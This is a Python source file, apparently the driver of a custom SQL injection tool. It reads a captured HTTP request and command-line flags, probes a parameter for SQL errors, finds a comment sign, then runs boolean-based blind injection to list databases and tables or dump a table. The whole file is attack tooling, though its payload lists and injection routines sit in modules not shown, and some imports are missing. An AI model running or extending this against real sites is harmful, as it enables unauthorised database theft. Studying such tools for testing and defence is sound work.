import requests
import sys
import copy
import os

from DB import DB
from Table import Table
from HTTPRequest import HTTPRequest
from UserFlags import UserFlags
from Enums import HTTP_Types
from BooleanBasedInjection import *
from HandleRequests import *
from STRINGS import *


def parse_request_file(request_filepath):
    """
    parses a txt file of a request (copied from fiddler, for example) into a HTTPRequest Object
    :param request_filepath: the path to the txt file
    :return: a HTTPRequest object containing all the data
    """
    if not os.path.exists(request_filepath):
        print(FILE_NOT_FOUND_ERROR)
        exit(0)
    with open(request_filepath) as fp:
        lines = fp.read().splitlines()
    request = HTTPRequest()
    headers = True
    for i in range(0, len(lines)):
        if i == 0:
            request.set_method(HTTP_Types[lines[i].split(" ")[0]])
            request.set_url(lines[i].split(" ")[1])
        else:
            if lines[i] == '':
                headers = False
            elif headers:
                header_name = lines[i].split(HEADER_SEP)[0]
                request.set_header(header_name, lines[i].split(header_name + HEADER_SEP)[-1])
            else:  # assuming only parameters and no data
                for parameter in lines[i].split(AMPERSAND):
                    name = parameter.split(EQUAL_SIGN)[0]
                    value = parameter.split(name + EQUAL_SIGN)[1]
                    request.set_parameter(name, value)
    return request


def get_request_copy(request):
    """
    creates a deep copy of a HTTPRequest object and all of its attributes
    :param request: the object we want to copy
    :return: a copy of this object
    """
    new_request = copy.deepcopy(request)
    new_parameters = copy.deepcopy(request.get_parameters())
    new_headers = copy.deepcopy(request.get_headers())
    new_request.set_parameters(new_parameters)
    new_request.set_headers(new_headers)
    return new_request


async def find_sqli(request, parameter, session):
    """
    checks if the parameter given is sqli vulnerable by sending multiple requests to the server with different special
    characters and checking whether the response contains an error message
    :param request: a HTTPRequest object whose data we will change and send
    :param parameter: the GET/POST parameter we want to check
    :return: the character causing the error, or NOT_DETECTED string if no error was caused
    """
    for char in SQLI_CHARS:
        response = await send_sql_request(request, parameter, char, session)
        response_text = await response.text()
        for error_msg in SQL_ERRORS:
            if error_msg in response_text.lower():
                print(SQLI_DETECTED_MSG)
                return char
    print(SQLI_NOT_DETECTED_MSG)
    return NOT_DETECTED

async def find_comment_sign(request, parameter, session):
    """
    checks which char is valid as a comment starter
    :param request: a HTTPRequest object whose data we will change and send
    :param parameter: the GET/POST parameter which is exploitable
    :return: the character marking a comment, or NOT_DETECTED string if no error was caused
    """
    for sign in SQL_COMMENTS:
        response = await send_sql_request(request, parameter, APOSTROPHE + sign, session)
        for error_msg in SQL_ERRORS:
            response_text = await response.text()
            if error_msg not in response_text.lower():
                return sign
    print(SQLI_NO_COMMENT_SIGN_DETECTED)
    return NOT_DETECTED

def parse_user_input():
    flags = UserFlags()
    i = 1
    while (i < len(sys.argv)):
        if sys.argv[i] == READ_REQUEST_FILE_FLAG:
            i = i + 1
            flags.set_request_file_path(sys.argv[i])
        elif sys.argv[i] == PARAMETER_FLAG:
            i = i + 1
            flags.set_parameter(sys.argv[i])
        elif sys.argv[i] == RETURN_DBNAMES_FLAG:
            flags.set_action(FIND_DB_NAMES)
        elif sys.argv[i] == RETURN_TABLESNAMES_FLAG:
            flags.set_action(FIND_TABLE_NAMES)
        elif sys.argv[i] == DUMP_TABLE_FLAG:
            flags.set_action(DUMP_TABLE)
        elif sys.argv[i] == TABLE_FLAG:
            i = i + 1
            flags.set_table_name(sys.argv[i])
        elif sys.argv[i] == DB_FLAG:
            i = i + 1
            flags.set_db_name(sys.argv[i])
        elif sys.argv[i] == HELP_FLAG:
            print(HELLO_MESSAGE)
            exit(0)
        else:
            print(ILLEGAL_USE_OF_FLAGS_ERROR)
            exit(0)

        i = i + 1
    if flags.get_request_file_path() == "":
        print(REQUEST_FILE_NOT_SPECIFIED_ERROR)
        exit(0)
    if flags.get_parameter() == "":
        print(PARAMETER_NOT_SPECIFIED_ERROR)
        exit(0)
    if flags.get_action() == NO_ACTION:
        print(ACTION_NOT_SPECIFIED_ERROR)
        exit(0)
    if flags.get_action() == FIND_TABLE_NAMES and flags.get_db_name() == "":
        print(TABLES_DBNAME_NOT_SPECIFIED_ERROR)
        exit(0)
    if flags.get_action() == DUMP_TABLE and (flags.get_db_name() == "" or flags.get_table_name() == ""):
        print(DUMP_NOT_SPECIFIED_ERROR)
        exit(0)

    return flags


async def main():
    flags = parse_user_input()
    origin_request = parse_request_file(flags.get_request_file_path())
    parameter = flags.get_parameter()
    request = get_request_copy(origin_request)
    async with aiohttp.ClientSession() as session:
        is_there_sqli = await find_sqli(request, parameter, session)
        if is_there_sqli == NOT_DETECTED:
            exit(0)
        comment = await find_comment_sign(request, parameter, session)
        if comment == NOT_DETECTED:
            exit(0)
        await boolean_based_injection(request, parameter, comment, session, flags)


if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
    loop.close()

